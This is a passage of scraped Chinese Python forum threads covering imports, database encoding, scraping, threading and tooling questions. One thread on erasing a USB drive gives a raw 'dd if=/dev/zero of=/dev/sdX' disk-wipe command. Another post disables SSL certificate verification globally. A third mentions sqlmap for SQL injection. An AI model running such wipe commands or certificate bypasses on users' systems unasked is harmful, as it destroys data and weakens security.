{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://app.py\" rel=\"nofollow\">app.py</a></p>\n<pre><code>import pdb;pdb.set_trace()\napp = 1\nimport model\n#from model import User #ImportError: cannot import name 'User'\nprint(app)\nprint(model)\n#print(model.User) #AttributeError: module 'model' has no attribute 'User'\n</code></pre>\n<p><a href=\"http://model.py\" rel=\"nofollow\">model.py</a></p>\n<pre><code>import pdb;pdb.set_trace()\nfrom app import app\nUser = app + 1\n</code></pre>\n<p>执行顺序</p>\n<pre><code>$ python app.py\n&gt; /tmp/demo/app.py(2)&lt;module&gt;()\n-&gt; app = 1\n(Pdb) n\n&gt; /tmp/demo/app.py(3)&lt;module&gt;()\n-&gt; import model\n(Pdb) n\n&gt; /tmp/demo/model.py(2)&lt;module&gt;()\n-&gt; from app import app\n(Pdb) n\n&gt; /tmp/demo/app.py(2)&lt;module&gt;()\n-&gt; app = 1\n(Pdb) n\n&gt; /tmp/demo/app.py(3)&lt;module&gt;()\n-&gt; import model\n(Pdb) n\n&gt; /tmp/demo/app.py(4)&lt;module&gt;()\n-&gt; print(app)\n(Pdb) n\n1\n&gt; /tmp/demo/app.py(5)&lt;module&gt;()\n-&gt; print(model)\n(Pdb) n\n&lt;module 'model' from '/tmp/demo/model.py'&gt;\n--Return--\n&gt; /tmp/demo/app.py(5)&lt;module&gt;()-&gt;None\n-&gt; print(model)\n(Pdb) n\n--Return--\n&gt; &lt;frozen importlib._bootstrap&gt;(222)_call_with_frames_removed()-&gt;None\n(Pdb) c\n1\n&lt;module 'model' from '/tmp/demo/model.py'&gt;\n</code></pre>\n<p>回想自己学 Flask 的时候，也在这里被坑的好惨（前几天不长记性又被坑了一次）。<br>\n这里有个很严重的问题，你需要小心翼翼地理清导入顺序，而且就算程序跑起来了，\n某些模块可能执行了两次，造成意想不到的结果。<br>\n解决方法是采用 Flask 最佳实践  <a href=\"https://zhuanlan.zhihu.com/p/22774028\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/22774028</a></p>\n<p>但是呢，这是 Python 的缺陷还是 Flask 的缺陷？<br>\n我认为这是 Flask 的设计缺陷，<code>@app.route</code>看起来简单，全局对象用着一时爽，\n但是非常容易产生循环依赖，一不小心就掉坑里了。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python 循环导入的大坑(模拟 Flask 典型场景)", "comment": []},
{"content": ["<div class=\"topic_content\">PyMySQL 执行 SQL 语句的函数如下：\r<br> def query(self, sql, unbuffered=False):\r<br>        if isinstance(sql, text_type) and not (JYTHON or IRONPYTHON):\r<br>            if PY2:\r<br>                sql = sql.encode(self.encoding)\r<br>            else:\r<br>                sql = sql.encode(self.encoding, 'surrogateescape')\r<br>        self._execute_command(COMMAND.COM_QUERY, sql)\r<br>\r<br>PyMySQL 会把它要执行的 SQL 语句都执行一下 encode ，，这样我插入二进制数据时 SQL 语句中的二进制数据字节也会因此而被修改，插入数据库的数据显然就不是我要插入的数据了，，请问这种情况怎么办？？ PyMySQL 没有办法控制不对要执行的 SQL 语句 encode 吗？</div>"], "reply": "21", "tittle": "PyMySQL 插入二进制数", "comment": ["BASE64 编码后插入", " \r", "多谢，这种方法确实可行，可是却增加了 1/4 的数据量，而且存入和取出时还需要编解码，所以我还是希望能够找到直接存入二进制数据的方法", " \r", "刚刚看了下源码，无解\r", "问题不仅仅在 query 在 query 之前的参数化拼接也有转码\r", "\r", "可以尝试直接调用_execute_command 这个“私有”函数\r", "\r", "PS. 同时获知这货不支持参数化查询", " \r", "直接调用_execute_command 我试过了，报错“命令不同步”，所以绕过编码直接调用底层函数可能要写很多代码才行，，所以这种方法不可行\r", "\r", "不过我倒发现另外一个可行的方法，就是建立连接的时候 connect 函数参数 charset 设置为''而非'uft-8'，这样就算执行编码语句也不会改变数据，，可问题是如果这样的话其他需要编码的数据字段就得全部手动执行编码，非常麻烦\r", "\r", "所以我又想到一个另类的方法，建立两个 connect ，，一个 charset 为'utf-8'用来执行无二进制数据的 SQL 语句，一个 charset 为''专门执行有二进制数据的 SQL 语句\r", "\r", "不过这也太不优雅了，，我想 PyMySQL 不至于只能这么做吧", " \r", "我想我找到方法了：\r", "在插入二进制数据之前调用 con.set_charset('lati-1')，这样编码就不会改变数据\r", "在插入二进制数据之后调用 con.set_charset('utf-8')，", "楼主看这个\r", "\r", "\r", "\"binary\\x00data\".encode(conn.charset)\r", "\r", "PyMySQL 肯定是能处理好二进制的，这是个基本需求嘛", " \r", "\r", "你这是取巧办法啊\r", "每次都调用一次 encode 让人不放心..囧\r", "\r", " 依赖底层的编码处理，能用，但不靠谱", "补充：\r", "我认为还是趁早放弃在 MySQL 放二进制文件比较靠谱，要是数据小的话 base64 也不会增加太多空间消耗。\r", "从可靠性来看是更优选。", " \r", "比如二进制数'\\xF0\\xA0'放到 SQL 语句中它是\r", "\"INSERT INTO ........... '\\xF0\\xA0' ......\"\r", "可是 PyMySQL 在执行这条 SQL 语句前会对这条语句执行 encode('utf-8')，语句就变成了\r", "\"INSERT INTO ........... '\\xF0\\xC2\\xA0' ......\"\r", "看到没，，数据变了！！！这样 2 个字节的数据插入到 MySQL 里面就变成了 3 个字节！！！", "其实你再看一下源码，其中是只有你传过去的 sql 是 unicode 的时候才编码的，你可以自己拼接 sql ，然后编码成 utf-8 字符串传进去就不会再进行编码了", "而且如果你发送的 sql 是 unicode ，为了能在网络上发送，编码成二进制数据是很正常的啊，并没有什么问题", " \r", "多谢指点，如你所说，确实只有当 sql 是 unicode （ Py3 下的 str ）时才会执行 encode('utf-8')，所以在执行 sql 前执行一下编码变成 bytes 就不会在被编码了，，不过不能编码成 utf-8 再传，而是用 latin-1 编码再传", "execute\r", "\r", "满足你", " \r", "\r", "别上来就乱答，看过源码再说话，从 execute 开始到最终 query 好几层 encode 在上面", "我错了，我不该帮忙的\r", "你折腾你快乐，可惜没脑子", "我以后要记得教训，不能帮智障，不然还会被骂\r", "\r", "我不由想起一句话：脑子是个好东西，可惜你没有", "我还不由想起一个故事\r", "A:师傅，你的刀不行呀，你看，这个骨头砍了半天砍不断\r", "B:你刀拿反了", "A:师傅，你不懂不要瞎说，刀不是砍骨头的嘛\r", "B:你刀拿反了\r", "A:师傅，是不是你的刀是伪劣产品\r", "B:你刀拿反了\r", "\r", "我一笑而过", " \r", "知之为之啊少年，人家好心给你指出错误，你不感谢也就罢了，竟然还嘲讽。。。\r", "\r", "cursor.execute()最终也是要调用 connection.query()的", "你刀拿反了", "自己拼接 SQL 语句，把数据转换成 0x0123456789abcdef 这样的十六进制字面值应该是可以的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 Python v2.7.10 来访问两个设备（都是在内网，估计证书都很久了的），只有 https 的接口，就是访问一个网址，在 url 中传入参数，然后就会返回数据。\n设置了全局不验证</p>\n<p>ssl._create_default_https_context = ssl._create_unverified_context</p>\n<p>response = urllib2.urlopen(url, timeout = 30)\nbuf = response.read()\nresponse.close()\n其中一个设备能顺利获取数据，另外一个就会报异常 SSLError: ('The read operation timed out',)\n问下有啥思路么？搜了一圈没有找到</p>\n</div></div>", "<div class=\"topic_content\">问题解决了，就是访问超时，增加超时时间就可以了。\r<br>\r<br>之前是其他人调试的，说浏览器打开比较快。但是实际看一下，只是有时候浏览器打开比较快，也有很多时候打开比较慢。</div>"], "reply": "1", "tittle": "访问 https 的网络接口出现 SSLError: ('The read operation timed out',)异常", "comment": ["tool curl test ，可以帮你查问题"]},
{"content": "", "reply": "1", "tittle": "python 中全局函数和类函数有啥区别！", "comment": ["请搜索\r", "变量的作用域\r", "闭包"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>mydumper 和 mysqlpump 在特定场景下会有些限制，于是自己用 python 封装 mysqldump ，实现以多线程的方式导出库表的操作，再以 mysql 命令多线程导入新库，用于成倍加快导出，特别是导入的速度。这一切只需要在 mysqldump 或 mysql 命令前面加上 <a href=\"http://mypumpkin.py\" rel=\"nofollow\">mypumpkin.py</a> 即可。</p>\n<p>Github 项目地址 <a href=\"https://github.com/seanlook/mypumpkin\" rel=\"nofollow\">https://github.com/seanlook/mypumpkin</a></p>\n<p>介绍和使用见 <a href=\"http://seanlook.com/2016/11/17/python-mysqldump-out-in-concurrency-magic/\" rel=\"nofollow\">http://seanlook.com/2016/11/17/python-mysqldump-out-in-concurrency-magic/</a></p>\n</div></div>"], "reply": "5", "tittle": "让 mysqldump 变成并发导出导入的魔法", "comment": ["赞", "有没有可以限制 mysqldump 速度的？？现在执行 sqldump 整个数据库操作非常慢", " 限流这个倒蛮新颖的，我这个工具一开起来基本上能把带宽或磁盘打满，源数据库 IO 会特别高。\r", "\r", "mydumper 可以做到表上的多并发，可以每次 select chunk sleep 几毫秒来实现...", " 欢迎提建议...", "限流（不基于数据语义）可以用 pv 工具"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人 py 新手，最近想写个脚本，正则匹配影片的\"号码\"及新建相应的规范标题文件夹如:\"ABC-000\"这样的(资源比较乱...)，下面是其中一部分渣代码，</p>\n<pre><code>key_sym = re.compile(r\"[a-zA-Z]{2,5}[\\_\\-]{1,2}\\d{2,3}\")  #中间有符号\nkey_mid = re.compile(r\"[a-zA-Z]{2,5}00\\d{2,3}\")    #中间是 00\nkey_non = re.compile(r\"[a-zA-Z]{2,5}\\d{2,3}\")       #中间没有东西\nkey_low = re.compile(r\"^[a-z]{2,5}\")     #小写开头\nkey_int = re.compile(r\"\\d{2,3}$\")          #数字结尾\nkey_upp = re.compile(r\"^[A-Z]{2,5}\")\ndef get_num(self):\n    if key_sym.findall(self):\n        flname = key_sym.findall(self)[0]\n        if re.match(key_low,flname):\n            flname = re.findall(key_low,flname)[0].upper() + '-' + re.findall(key_int,flname)[0]\n        elif re.match(key_upp,flname):\n            flname = re.findall(key_upp,flname)[0] + '-' + re.findall(key_int,flname)[0]\n        return flname\n    elif key_mid.findall(self):\n        flname = re.sub(r\"00\",'-',key_mid.findall(self)[0])\n        if re.match(key_low,flname):\n            flname = re.findall(key_low,flname)[0].upper() + '-' + re.findall(key_int,flname)[0]\n        return flname\n    elif key_non.findall(self):\n        str1 = key_non.findall(self)[0]\n        flname = re.findall(r\"[a-zA-Z]{2,5}\",str1)[0] + '-' + re.findall(r\"[0-9]{2,3}\",str1)[0]\n        if re.match(key_low,flname):\n            flname = re.findall(key_low,flname)[0].upper() + '-' + re.findall(key_int,flname)[0]\n        return flname\n    else:\n        with open('C:/python/Not_finish.txt','a') as f:\n            f.write(self + '\\n')\n            f.close()\n        print(self + '  Not Format')\n</code></pre>\n<p>思路是遇到符合的影片就返回标准的名称比如:\"ABC-000\"这样的，不符合正则的就写入到一个 txt 文件中作为标记。</p>\n<p>问题是每次此函数遇到不符合正则的的确会写入 txt ，但是 for loop 也因此中断了。。</p>\n<pre><code>test = r'N:\\HBAD '\nprint(os.listdir(test))\ntry:\n    for a in os.listdir(test):\n        if not os.path.exists(os.path.join(test,get_num(a))):\n            os.mkdir(os.path.join(test,get_num(a))) #问题是 get_num()一遇到不符合正则的文件就会写入 txt ，然后中断递归\nexcept Exception as  e:\n    print(str(e))\n</code></pre>\n<p>请问应该如何修改才能达到将不符合的文件写入 txt 后， for loop 仍能保持递归？尝试过在打开文件那里 return 不符合的文件名，的确 for loop 不会中断但相应的多新建了一个没用的文件夹。。</p>\n<p>第一次发帖不懂，代码也很渣，还望各位多指点</p>\n</div></div>"], "reply": "1", "tittle": "请教一个比较低级的问题？", "comment": ["把 for loop 从 try 代码块中移出， try 只包含 os.mkdir(os.path.join(test,get_num(a))) 这一句"]},
{"content": ["<div class=\"topic_content\">需求：\r<br>我是需要在一张图片上添加文字，可以理解为水印。\r<br>\r<br>问题：\r<br>保存图片时整张图凡事添加过文字的地方会有毛边，看起来非常的廉价。\r<br>\r<br>细节：\r<br>通过 image 对象打开一张图片后，创建 draw ，在 draw.text 添加文字，最后 img.show 或者 save ，出来的文件一，字体周围有毛边，第二，字体效果跟我通过 Photoshop 同规格的字体效果不一样。\r<br>\r<br>请问有朋友遇到过这方面问题吗？\r<br>或者有比 pil 更好的解决方案？\r<br>\r<br>手机打的，感谢各位帮助！</div>"], "reply": "2", "tittle": "PIL 图片文字处理保存后整张图模糊问题", "comment": ["可能要设置抗锯齿", "嗯，又有新的问题。\r", "在 Mac 下 使用宋体的 ttf 文件，输出的字不一样。\r", "但使用我在网上找的一个新宋体 TTc 的版本数字字体可以保持一致，可文字字体输出为方块。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 sf 上看到个问题，<a href=\"http://piaofang.maoyan.com/?date=2016-12-03\" rel=\"nofollow\">猫眼电影</a> 上的数字居然用字体代替的，网页源码：</p>\n<p><code>&lt;span id=\"ticket_count\"&gt;&lt;i class=\"cs\"&gt;.万&lt;/i&gt;&lt;/span&gt;</code></p>\n</div></div>"], "reply": "1", "tittle": "猫眼电影的票房数字如何用 python 抓取？", "comment": ["简单数字去噪二值化识别： ", "\r", "验证码破解原理： ", "\r", "机器学习式破解： ", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有个 U 盘，虽然隐私数据都被删除了，但怕别人用软件恢复这些数据，所以想创建一个大文件来覆盖整个 U 盘，这个文件应怎么创建？</p>\n<p>with open('test','wb') as f:</p>\n<pre><code>      while True:\n            if f.tell()&gt;=SIZE: break\n            f.write(b'\\xFF')\n</code></pre>\n</div></div>"], "reply": "15", "tittle": "如何创建定量大小的文件（用于覆盖隐私数据）", "comment": ["低格", "要用随机数据", "使用 hd tune 或者 dg 直接填一遍即可。", "dd if=/dev/urandom of=sample.txt bs=1G count=1\r", "\r", "Ref:\r", "For Windows:\r", " Windows 也可以用 dd ……不过没 random 所以只能填零。", "最简单的格式化一下就行,不要点上快速格式化,让他完全格式化!", "dd if=/dev/zero of=/dev/sdX\r", "\r", "谨慎使用", "复制几个电影进去就好了", "复制几个小电影进去。\r", "\r", "\r", "最好你有你要删除文件的文件名，用那些文件名，有奇效！", "没有刚好那么大的电影", "把这个 U 盘建一个 bitlocker ，然后格式化就可以了。", " 随便一款压缩软件都能分卷压缩，用复制模式，等于把电影分成几个等份大小的文件不就完了。", "我的做法是有敏感数据的直接物理销毁\r", "当然，里面数据的价值远远高于设备价值", "import os\r", "with open('w', 'w') as f:\r", "    f.write(os.urandom(1234567))"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>近半年读了较多函数式编程的书，算是彻底迷上了函数式编程，由于自己用 python 比较多，现在在 python 编程中也喜欢使用大量的函数式编程风格，有时可以写得很优美，有时则会显得比较令人费解。很多文章说 python 并不是一门很好的函数式编程语言，函数式编程风格也不那么的 pythonic ，所以不推荐在 python 中大量使用函数式风格。所以，大家怎么看这个问题？</p>\n</div></div>"], "reply": "11", "tittle": "在 python 编程中大量使用函数式风格，推荐吗？", "comment": ["严格来说， python 并不是一门函数式编程语言，祖师爷 Guido 实际上并不喜欢函数式风格，现在的 PSF 对函数式风格的支持也不是很情愿，只是由于群众的呼声，才加上了一些常见的函数式编程特性，就这样， python 3 里还把 reduce 移到 functools 模块里了。\r", "\r", "但是不可否认，函数式编程风格在解决了某些问题，特别是科学计算类的问题是非常自然的，科学计算有时只是将数学公式翻译为编程语言而已，这时，更接近数学语言的函数式编程风格更加适用与自然。在这些工作中，大量使用函数式编程风格是可行的，别人也更好理解。\r", "\r", "在 python 中运用函数式编程，除开最基本 map, filter, reduce 几个函数要熟练外，最关键提要理解高阶函数的概念。函数式编程的核心理论就是将大问题拆分为小问题，直到拆解成某个容易解决的原始问题，这时高阶函数便起到了核心作用。\r", "\r", "关于 python 中高阶函数的介绍，可以参见这篇译文： ", "\r", "\r", "关于如何在 python 中使用函数式编程风格，可以参考这篇文章： ", "\r", "\r", "总之，是否可以大量使用函数式编程风格，还是视你的编程领域而定，毕竟 python 是一门通用性语言，在不同的社区中的的最佳实践是大相径庭的。个人意见，仅供参考。", " 有道理，我也感觉编程风格方面不能钻牛角尖，写出健壮、易读、直观的代码才是最重要的", " 这里存在一个度的问题，比较难把握", "不推荐，要学函数式编程，建议直接上 Haskell ，才能学到函数式编程的精髓", "同意二楼", "个人觉得不适合。首先， Python 的递归默认有深度限制，并且不支持尾递归。另外， Python 的 lambda 函数不能换行，这个也比较麻烦。\r", "\r", "再看看函数式编程最为著名的三个工具： map ， filter ， reduce 。先说 reduce ，在 Python 2 中， reduce 是内建函数，但是在 Python 3 中却放到了 functools 模块里。再看 map 和 filter ， Python 中完全被列表推导式替代了，可以说几乎没什么地位。\r", "\r", "另外，再看看 Python 创始人对递归的一些评论：\r", "> Third, I don't believe in recursion as the basis of all programming. This is a fundamental belief of certain computer scientists, especially those who love Scheme and like to teach programming by starting with a \"cons\" cell and recursion. But to me, seeing recursion as the basis of everything else is just a nice theoretical approach to fundamental mathematics (turtles all the way down), not a day-to-day tool.\r", "\r", "虽然递归不是函数式编程的全部，但是字里行间可以感受出来他对函数式编程是不太友好的……所以 Python 的设计哲学中函数式编程可能也不会占太大的位置。\r", "\r", "文章链接：\r", "据说 Python function call 有 overhead", "不推荐，别的不说，举个例子，我现在接手的项目就是大量的函数式，从代码的风格上来说很多与 python 的特性想违背，很不友好，（至少从大部分人的角度来看是这样的）", "没必要， 不推荐。。", "如果你想玩函数式，为什么不从 Ruby 开始玩起呢？强势安利一发 Ruby 。", " +1"]},
{"content": ["<div class=\"topic_content\">#run.py\r<br>def logfun(logstr):\r<br>    global loglist\r<br>    try:\r<br>        loglist.append(logstr)\r<br>    except Exception as e:  \r<br>        pass\r<br>\r<br>def fun8():\r<br>    global loglist\r<br>    logfun('执行 fun8')\r<br>\r<br>global loglist\r<br>loglist = []\r<br>logfun('执行第 1 步')\r<br>fun8()\r<br>print(loglist)\r<br>\r<br>我想做一个日志输出模块，方便出错时查找问题，用了全局变量，如上边代码所示，运行结果是：\r<br>['执行第 1 步', '执行 fun8']\r<br>['执行第 1 步', '执行 fun8']\r<br>两个问题：\r<br>1. 为什么一个输出有两行显示？\r<br>2. 现在，我把 logfun()单放到了一个模块里，再执行时显示的是[]，这是为什么呢？\r<br>#fun_log.py\r<br>def logfun(logstr):\r<br>    global loglist\r<br>    try:\r<br>        loglist.append(logstr)\r<br>    except Exception as e:  \r<br>        pass\r<br>\r<br>#run.py\r<br>def fun8():\r<br>    global loglist\r<br>    fun_log.logfun('执行 fun8')\r<br>\r<br>global loglist\r<br>loglist = []\r<br>fun_log.logfun('执行第 1 步')\r<br>fun8()\r<br>print(loglist)</div>"], "reply": "6", "tittle": "在模块里使用全局变量为什么没有数据？", "comment": ["为什么要用全局变量。。", " 我想把每个函数每个模块的运行步骤都放到 loglist 中，用全局变量是最简单的。", "为什么不用 logging?", " logging 没我自己做的详细", "你对 Python 的全局变量的理解不对：\r", "\r", "1.  logfun 中不需要使用 global loglist \r", "2.  全局变量是模块级别，因此需要在 fun_log.py 中初始化列表: loglist = []\r", "3. 要查看 fun_log 模块的全局变量， print(fun_log.loglist)", " 终于搞定了，多谢点拨！"]},
{"content": "", "reply": "目前尚无回", "tittle": "PyCharm 的语法高亮里不能区分方法和变量么?", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Gayhub repo:<br>\n<a href=\"https://github.com/supersu097/mycrawler\" rel=\"nofollow\">https://github.com/supersu097/mycrawler</a><br>\n<img alt=\"\" src=\"https://github.com/supersu097/mycrawler/blob/master/screenshot/keyword_filter.png\"><br>\n上面的图片来自 gayhub 不知道 v2 支不支持，图不显示的话直接上 gayhub 看哦（是个看雪的最终效果图），最后欢迎各种 pr 啊</p>\n</div></div>"], "reply": "7", "tittle": "写了俩微小的爬虫，一个爬垠神 blog 一个爬看雪论坛(同事的需求），欢迎来玩哦~", "comment": ["噗...图果然挂了，本来以为预览不显示，实际会 ok ， but...", "加载图片用的语法是![](url)，编辑的时候选的 markdown", "\r", "\r", "地址不是应该用 raw 地址么 _(:з」∠)_", " 不知道哦， chrome 右键直接复制图片地址的", "那啥系统提示有好几个人收藏了，泥萌也表忘记去 gayhub 上 star 哦(^_^)", "厉害!已 star,请问楼主能否帮忙解答一下,用 Python 爬虫的方法能监控 discuz 论坛某个帖子回帖的数目实时刷新不?", " 哦这个呀，实时的木有试过，我理解的话，就是不去调用 time.sleep()了，回帖数目的刷新数应该是有个 html 元素在页面上的，把 get 请问放在 while 循环里面，一直去读取你想监控的帖子，然后去解析那个数字做判断应该就可以了，不过感觉这样容易被封什么的😆"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在学习生产者消费者模型，假如有如下需求：从某个网址读取 log ，提取出用户 id 然后发送邮件。在不涉及数据库操作的情况下，下面的示例代码（打不开 gist 只能贴在这里了。。）可以运行。</p>\n<p>但现在问题来了，如果需要将每一次读取的 log 内容和发送记录都存储在数据库里，保证同一个 id 只收到一次，这个数据库操作应该放在哪个线程里面呢？ 用的是 kennethreitz 大神的 <a href=\"https://github.com/kennethreitz/records\" rel=\"nofollow\">records</a> + Python 自带的 Sqlite3 ，尝试了在 2 个 Thread <code>__init__</code> 的时候分别连接同一个数据库文件，但是提示在一个线程内创建的连接不能在另一个线程内使用，这里有些迷惑。 Or 这个需求可以用另外的原理完成？</p>\n<pre><code>import threading\nimport time\nimport Queue\n\nQ = Queue.Queue()\nclass ProducerThread(threading.Thread):\n    def __init__(self, out_q):\n        threading.Thread.__init__(self, name='Producer')\n        self.q = out_q\n\n    def run(self):\n        while True:\n            # 这里读取 log\n            log = getlog()\n            if log:\n                for each in log:\n                    self.q.put(each)\n            else:\n                print('NO MORE LOG')\n                time.sleep(60)\n\n\nclass ConsumerThread(threading.Thread):\n    def __init__(self, out_q):\n        threading.Thread.__init__(self, name='Consumer')\n        self.q = out_q\n\n    def run(self):\n        while True:\n            # consume the data.\n            chunk = self.q.get()\n            print(u'开始发送...{0}'.format(chunk))\n            time.sleep(2)  # 模拟发送\n            self.q.task_done()\n\n\ndef main():\n    t = ProducerThread(Q)\n    t.start()\n    c = ConsumerThread(Q)\n    c.start()\n    Q.join()\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n</div></div>"], "reply": "8", "tittle": "请教 Python 的 producer-consumer 模型与数据库操作问题", "comment": ["数据库本身就有读写锁，直接在两个线程里面各自连接数据库不就好了嘛", " 现在是有 3 个线程，如果我连接数据库写在 producer 的 `__init__` 里面，会提示这个 sqlite3 object 是在主线程里创建的呢。。我的理解是这样是在 producer 这个线程内创建的啊。。？\r", "\r", "```python\r", "def __init__(self):\r", "    self.db = sqlite3.connect('db.db')\r", "```", " \r", "t = ProducerThread(Q) 这个时候就会调用了__init__了，所以是在主线程的，\r", "t.start() 会调用 run 方法，你把连接的代码挪到 run 方法里面去应该就好了", " en ，测试了一下目前是好的。。现在要处理两个线程同时写入这个数据库的问题了。。是不是又要开一个队列执行数据库的写操作呀。", " 不需要，你直接写就好，数据库层有读写锁保护的，没有问题的", "当然，如果你的写并发量大的话，用队列，然后起一个专门的数据库写线程，性能会好一点", " python + sqlite3 好像不行呀，万一我那个写入 log 和写入发送记录同时写入就会报错== （其实这两个放在两个数据库文件里会不会更好？", " \r", "看了下文档果然，不过你可以控制下超时时间 ", "\r", "针对你的需求来说，反正是完全独立的表，之间不需要建立关联的直接分两个数据库确实比较好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>import rsa\nsignature = rsa.sign(code2, RSA_PRIVATE, 'SHA-1')</p>\n<p>报错:\nTraceback (most recent call last):\nFile \"D:/paython/<a href=\"http://test.py\" rel=\"nofollow\">test.py</a>\", line 104, in &lt;module&gt;\nsignature = rsa.sign(code2, RSA_PRIVATE, 'SHA-1')\nFile \"C:\\Python27\\lib\\rsa\\<a href=\"http://pkcs1.py\" rel=\"nofollow\">pkcs1.py</a>\", line 276, in sign\nkeylength = common.byte_size(priv_key.n)\nAttributeError: 'str' object has no attribute 'n'</p>\n<p>求助！</p>\n</div></div>"], "reply": "3", "tittle": "求助 Python 用 RSA 签名报错", "comment": ["很明显，参数传入不正确", " code2 是字符串 key 用几种格式试了都是这个结果", "小白求助大家\r", "Google 搜了下也没找到解决方案"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不讨论为什么不直接 Linux 下部署\nRT</p>\n</div></div>"], "reply": "6", "tittle": "Win 下 Python WEB 部署有什么好的工具吗？", "comment": ["Docker", "如果不用 Docker 来做虚拟化，直接运行于 原生 Win 上，有什么好的方案吗？", "没有", "可以直接内网转发，把内网的端口通过公网转发出去，一分钟一行代码搞定，简单快捷，缺点就是服务机不能关机。\r", "装个 cygwin", "够闲的话，可以试试 IIS 然后折腾一下 CGI ，把 py 挂起来。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>$ python sqlmap.py  -h\n[CRITICAL] incompatible Python version detected ('3.5.2'). For successfully runn\ning sqlmap you'll have to use version 2.6 or 2.7 (visit 'http://www.python.org/d\nownload/')\n\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "sqlmap 不支持 python3，有替代的吗？", "comment": ["这个库听名字像是 ORM 库?", "任何库(非特殊情况)都推荐使用 virtualenv\r", "\r", " sql 注入用的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天升级到了 2016.3 这个版本，启动画面做的还挺用心，</p>\n<p>但是感觉对于 Terminal 部分启动只认 pyenv ，无视 conda 的环境管理，举个栗子</p>\n<p>这是旧版的 Terminal 开启的画面，输入 which python\n<img alt=\"旧版\" src=\"https://i.v2ex.co/06809vWWl.png\"></p>\n<p>他代表的意思是至少我能使用我本机配置的 Anaconda 环境，切换不切换我自己可以控制</p>\n<p>本次升级重大功能自动切换 Pyenv 环境，然后这是新版的效果，\n<img alt=\"新版\" src=\"https://i.v2ex.co/3dnOZBFWl.png\"></p>\n<p>这个功能有很大的有点比如引导开发用配置环境，但是我如果想切换到本机的 conda 环境直接就跪了\n很麻烦，，</p>\n<p>有哪位大神迈过了这个 Terminal 的坎儿，求教育</p>\n<p>现在我的方法是，，退回到 2016.2,,,感觉略 Low 逼</p>\n</div></div>"], "reply": "21", "tittle": "被 Pycharm 2016.3 的 Terminal 恶心到了", "comment": ["楼主你使用普通 terminal 的时候现象是前者呢还是后者呢？如果是后者的话，说明这不是 pycharm 的问题，只是 pycharm 的 terminal 更完善了而已。", "先看一下这个项目选择的是哪个 python interpreter 吧", "不太懂你们，怎么总是容易被恶心到？", "而且好像 os 获取当前路径也被影响了", "我只知道用 pycharm2016.3 这个 Terminal ，一些命令认不到了，例如在 pycharm4.5 的终端中用的好好的 rbt 命令；", "楼主你可以到自己的 JetBrains 账号里开 support ticket 的，如果你是付费用户的话。", "流石全球工单系统", "Linux 下 更新太麻烦了，就没有更新，还有这问题？ 试试手动断开？", "感觉选择 linux 桌面版 + ide  ，还不如在 Windows 下面。", "  普通的 Terminal 是前者的\r", "\r", " 切换了，，不识别。。。\r", "\r", "\r", " 就打不开正常的终端。。\r", "\r", " thx,, 已提交", "你没用 zsh", "设置中搜 terminal ，里面把 /bin/bash 改成 /bin/zsh ，如果你装了 zsh", "新版的连用 brew 安装的 python2 和 python3 都不认了，只认系统自带的 python ，还要修改 terminal 的 rcfile 才行，每个都成都是，确实恶心死我了。", "github 上有 pycharm 源码，\r", "不喜欢的就修改。。", "你默认 Terminal 是不是 zsh ？\r", "\r", "这个默认用的是 bash ，自己环境变量都配不好，说别人软件恶心？", "terminal 可以设置，这个功能确实是有 bug ，比如基于 oh-my-zsh 自己写的插件以及 alias 就不能很好地支持。看了 issue 说是下个版本修", ", @", ",  @", " ,,, thx , \r", "\r", "平常还真不用 zsh,,\r", "貌似新版是支持这个功能，我再研究下~", " jb 的 IDE 开源？ Excuse me ？", "虽然没用过 pycharm ，但是不是可以指定使用的 terminal 吗", "搞定了，，配置一个 zsh ，，酷炫配置很多，但我这边最关键的就 3 行\r", "\r", "![配置]( ", ")\r", "\r", "然后配置一下 pycharm 中的 Terminal\r", "\r", "![配置 Pycharm]( ", ")\r", "\r", "然后就妥了", " PyCharm 是沒有的，但是有 Idea Community 版\r", " 源码里有 IDEA 的 Python 插件，和 PyCharm 几乎是等价的"]},
{"content": ["<div class=\"topic_content\">网站 <a target=\"_blank\" href=\"http://www.xiamiao.date\" rel=\"nofollow\">www.xiamiao.date</a>   <a target=\"_blank\" href=\"http://www.nextsecond.cn\" rel=\"nofollow\">www.nextsecond.cn</a>\r<br>另附有微信版：\r<br>微信号 xiamiao7 \r<br>\r<br><img src=\"http://ww2.sinaimg.cn/mw690/6d42e1ffgw1fabg09w041j20700700ta.jpg\" class=\"embedded_image\" border=\"0\"> \r<br>\r<br>请问可以加入 什么第三方的 django APP 来丰富功能呢？\r<br>欢迎各位提意见和建议！</div>"], "reply": "131", "tittle": "用 django 撸了一个校园交友网站", "comment": ["这网站首页太慢太臃肿，何不换用 php 做出来，多么的轻快爽。 python django 不是好的选择。", "  尝试用 symfony 做过一个版本 感觉没什么不一样..", "   FairyBBS 我也用过...感谢您无私指导，谢谢!  我按照您的方法  编译过语言文件，好像还是英文...  方便电话能私信留个微信么  我的邮箱是 一二一六五 ", "  没有什么干货... 如果有空写文档 就开源哈  现在忙着毕业找工作", " \r", " \r", "\r", "如果有兴趣 我争取年底  放上 github", "建议 cdn 换成 cloudflare 的", "给一个建议 这个网站居然没有声音 好尴尬。。动态画面必须搭配背景音乐啊 最好是那种轻松点的", "刚才再打开，网站报 502 哦～～～", "   还没有加 cdn = -=", "   恩恩 刚刚重启了哈", "  恩好哒 - - 特意把视频的声音给去掉了额...", "KeyError at /accounts/weibo/login/callback/\r", "'idstr'\r", "Request Method:\tGET\r", "Request URL:\t", "\r", "Django 